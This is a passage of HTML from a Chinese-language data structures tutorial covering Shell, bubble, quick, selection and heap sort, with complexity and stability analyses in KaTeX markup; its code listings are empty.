mtight">1.3</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。在最坏情况下希尔排序的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li><strong>稳定性</strong>：当相同关键字的记录被划分到不同的子表时，可能会改变它们之间的相对次序，因此希尔排序是一种不稳定的排序方法</li>
<li><strong>适用性</strong>：希尔排序算法仅适用于线性表为顺序存储的情况</li>
</ul>
<h3> 交换排序</h3>
<p>所谓交换，是指根据序列中两个元素关键字的比较结果来对换这两个记录在序列中的位置。基于交换的排序算法很多，这里主要介绍冒泡排序和快速排序。</p>
<h4> 冒泡排序</h4>
<p>冒泡排序的 <strong>基本思想</strong> 是：从后往前（或从前往后）两两比较相邻元素的值，若为逆序（即 <code>A[i - 1] &gt; A[i]</code>），则交换它们，直到序列比较完。称它为第一趟冒泡，结果是将最小的元素交换到待排序列的第一个位置（或将最大的元素交换到待排序列的最后一个位置），关键字最小的元素如气泡一般逐渐往上 “漂浮” 直至 “水面”（或关键字最大的元素如石头一般下沉至水底）。下一趟冒泡时，前一趟确定的最小元素不再参与比较，每趟冒泡的结果是把序列中的最小元素（或最大元素）放到了序列的最终位置……这样最多做 <code>n - 1</code> 趟冒泡就能把所有元素排好序。</p>
<p>冒泡排序算法的代码如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>冒泡排序的 <strong>性能分析如下：</strong></p>
<ul>
<li><strong>空间效率</strong>：仅使用了常数个辅助单元，因而空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li><strong>时间效率</strong>：当初始序列有序时，显然第一趟冒泡后 <code>flag</code> 依然为 <code>false</code>（本趟没有元素交换），从而直接跳出循环，比较次数为 <code>n - 1</code>，移动次数为 <code>0</code>，从而最好情况下的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>；当初始序列为逆序时，需要进行 <code>n - 1</code> 趟排序，第 <code>i</code> 趟排序要进行 <code>n - i</code> 次关键字的比较，而且每次比较后都必须移动元素 <code>3</code> 次来交换元素位置。这种情况下 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>比较次数</mtext><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo separator="true">,</mo><mtext>移动次数</mtext><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><mn>3</mn><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mn>3</mn><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac></mstyle></mstyle></mrow><annotation encoding="application/x-tex">\text{比较次数} = \displaystyle\sum_{i=1}^{n-1} (n - i) = \dfrac{n(n - 1)}{2}, \text{移动次数} = \displaystyle\sum_{i=1}^{n-1} 3(n - i) = \dfrac{3n(n - 1)}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">比较次数</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.0788em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord cjk_fallback">移动次数</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.0788em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 从而，最坏情况下的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，平均时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li><strong>稳定性</strong>：由于 <code>i &gt; j</code> 且 <code>A[i] = A[j]</code> 时，不会发生交换，因此冒泡排序是一种稳定的排序方法</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>冒泡排序中所产生的有序子序列一定是全局有序的（不同于直接插入排序），也就是说，有序子序列中的所有元素的关键字一定小于（或大于）无序子序列中所有元素的关键字，这样每趟排序都会将一个元素放置到其最终的位置上</p>
</div>
<h4> 快速排序</h4>
<p>快速排序的 <strong>基本思想</strong> 是基于分治法的：在待排序表 <code>L[1...n]</code> 中任取一个元素 <code>pivot</code> 作为枢轴（或称基准，通常取首元素），通过一趟排序将待排序表划分为独立的两部分 <code>L[1...k - 1]</code> 和 <code>L[k + 1...n]</code>，使得 <code>L[1...k - 1]</code> 中的所有元素小于 <code>pivot</code>，<code>L[k + 1...n]</code> 中的所有元素大于或等于 <code>pivot</code>，则 <code>pivot</code> 放在了其最终位置 <code>L(k)</code> 上，这个过程称为 <strong>一次划分</strong>。然后分别递归地对两个子表重复上述过程，直至每部分内只有一个元素或空为止，即所有元素放在了其最终位置上。</p>
<p>一趟快速排序的过程是一个交替搜索和交换的过程。假设划分算法己知，记为 <code>Partition()</code>，返回的是上述的 <code>k</code>，注意到 <code>L(k)</code> 己放在其最终位置，因此可以先对表进行划分，而后对两个表调用同样的排序操作。因此可以递归地调用快速排序算法进行排序，具体的程序结构如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>从上面的代码不难看出快速排序算法的关键在于划分操作，同时快速排序算法的性能也主要取决于划分操作的好坏。假设每次总以当前表中第一个元素作为枢轴来对表进行划分，则将表中比枢轴大的元素向右移动，将比枢轴小的元素向左移动，使得一趟 <code>Partition()</code> 操作后，表中的元素被枢轴一分为二。代码如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>快速排序算法的 <strong>性能分析如下：</strong></p>
<ul>
<li>
<p><strong>空间效率</strong>：由于快速排序是递归的，需要借助一个递归工作栈来保存每层递归调用的必要信息，其容量与递归调用的最大深度一致。最好情况下为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>；最坏情况下，因为要进行 <code>n - 1</code> 次递归调用，所以栈的深度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">o(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">o</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>；平均情况下，栈的深度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p>
</li>
<li>
<p><strong>时间效率</strong>：快速排序的运行时间与划分是否对称有关，快速排序的最坏情况发生在两个区域分别包含 <code>n - 1</code> 个元素和 <code>0</code> 个元素时，这种最大限度的不对称性若发生在每层递归上，即对应于初始排序表基本有序或基本逆序时，就得到最坏情况下的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p>
<p>有很多方法可以提高算法的效率：一种方法是尽量选取一个可以将数据中分的枢轴元素，如从序列的头尾及中间选取三个元素，再取这三个元素的中间值作为最终的枢轴元素；或者随机地从当前表中选取枢轴元素，这样做可使得最坏情况在实际排序中几乎不会发生。</p>
<p>在最理想的状态下，即 <code>Partition()</code> 可能做到最平衡的划分，得到的两个子问题的大小都不可能大于 <code>n / 2</code>，在这种情况下，快速排序的运行速度将大大提升，此时，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。好在快速排序平均情况下的运行时间与其最佳情况下的运行时间很接近，而不是接近其最坏情况下的运行时间。快速排序是所有内部排序算法中平均性能最优的排序算法。</p>
</li>
<li>
<p><strong>稳定性</strong>：在划分算法中，若右端区间有两个关键字相同，且均小于基准值的记录，则在交换到左端区间后，它们的相对位置会发生变化，即快速排序是一种不稳定的排序方法。例如：表 L = {3, <strong>2</strong>, 2}，经过一趟排序后 L = {2, <strong>2</strong>, 3}，最终排序序列也是 L= {2, <strong>2</strong>, 3}，显然，2 与 <strong>2</strong> 的相对次序己发生了变化。</p>
</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>在快速排序算法中，并不产生有序子序列，但每趟排序后会将上一趟划分的各个无序子表的枢轴（基准）元素放到其最终的位置上</p>
</div>
<h3> 选择排序</h3>
<p>选择排序的 <strong>基本思想</strong> 是：每一趟（如第 <code>i</code> 趟）在后面 <code>n - i + 1(i = 1, 2,… n - 1)</code> 个待排序元素中选取关键字最小的元素，作为有序子序列的第 <code>i</code> 个元素，直到第 <code>n - 1</code> 趟做完，待排序元素只剩下 <code>1</code> 个，就不用再选了。</p>
<h4> 简单选择排序</h4>
<p>根据上面选择排序的思想，可以很直观地得出简单选择排序算法的思想：假设排序表为 <code>L[1...n]</code>，第 <code>i</code> 趟排序即从 <code>L[i...n]</code> 中选择关键字最小的元素与 <code>L(i)</code> 交换，每一趟排序可以确定一个元素的最终位置，这样经过 <code>n - 1</code> 趟排序就可使得整个排序表有序。</p>
<p>简单选择排序算法的代码如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>简单选择排序算法的 <strong>性能分析如下：</strong></p>
<ul>
<li><strong>空间效率</strong>：仅使用常数个辅助单元，故空间效率为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li><strong>时间效率</strong>：从上述伪码中不难看出，在简单选择排序过程中，元素移动的操作次数很少，不会超过 <code>3(n - 1)</code> 次，最好的情况是移动 <code>0</code> 次，此时对应的表已经有序；但元素间比较的次数与序列的初始状态无关，始终是 <code>n(n - 1) / 2</code> 次，因此时间复杂度始终是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li><strong>稳定性</strong>：在第 <code>i</code> 趟找到最小元素后，和第 <code>i</code> 个元素交换，可能会导致第 <code>i</code> 个元素与其含有相同关键字元素的相对位置发生改变。例如：表 L = {2, <strong>2</strong>, 1}，经过一趟排序后 L = {1, <strong>2</strong>, 2}，最终排序序列也是 L = {1, <strong>2</strong>, 2}，显然，2 与 <strong>2</strong> 的相对次序己发生变化。因此，简单选择排序是一种不稳定的排序方法</li>
</ul>
<h4> 堆排序</h4>
<p>堆的定义如下，<code>n</code> 个关键字序列 <code>L[1...n]</code> 称为 <strong>堆</strong>，当且仅当该序列满足：</p>
<ol>
<li><code>L(i) &gt;= L(2i)</code> 且 <code>L(i) &gt;= L(2i + l)</code></li>
<li><code>L(i) &lt;= L(2i)</code> 且 <code>L(i) &lt;= L(2i + l)</code>（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>⩽</mo><mi>i</mi><mo>⩽</mo><mo stretchy="false">⌊</mo><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">1 \leqslant i \leqslant \lfloor n / 2 \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7962em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal">n</span><span class="mord">/2</span><span class="mclose">⌋</span></span></span></span>）</li>
</ol>
<p>可以将堆视为一棵完全二叉树，满足条件 <code>1</code> 的堆称为 <strong>大根堆</strong>（大顶堆），大根堆的最大元素存放在根结点，且其任意一个非根结点的值小于或等于其双亲结点值。满足条件 <code>2</code> 的堆称为 <strong>小根堆</strong>（小顶堆），小根堆的定义刚好相反，根结点是最小元素。</p>
<p>堆排序的 <strong>思路</strong> 很简单：首先将存放在 <code>L[1...n]</code> 中的 <code>n</code> 个元素建成初始堆，由于堆本身的特点（以大顶堆为例），堆顶元素就是最大值。输出堆顶元素后，通常将堆底元素送入堆顶，此时根结点己不满足大顶堆的性质，堆被破坏，将堆顶元素向下调整使其继续保持大顶堆的性质，再输出堆顶元素。如此重复，直到堆中仅剩一个元素为止。可见堆排序需要解决两个问题：一如何将无序序列构造成初始堆；二输出堆顶元素后，如何将剩余元素调整成新的堆。</p>
<p>堆排序的关键是构造初始堆。<code>n</code> 个结点的完全二叉树，最后一个结点是第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor n / 2 \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal">n</span><span class="mord">/2</span><span class="mclose">⌋</span></span></span></span> 个结点的孩子。对第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor n / 2 \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal">n</span><span class="mord">/2</span><span class="mclose">⌋</span></span></span></span> 个结点为根的子树筛选（对于大根堆，若根结点的关键字小于左右孩子中关键字较大者，则交换），使该子树成为堆。之后向前依次对各结点（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌋</mo><mo>−</mo><mn>1</mn><mtext>&nbsp;</mtext><mn>1</mn></mrow><annotation encoding="application/x-tex">\lfloor n / 2 \rfloor - 1 ~ 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal">n</span><span class="mord">/2</span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace nobreak">&nbsp;</span><span 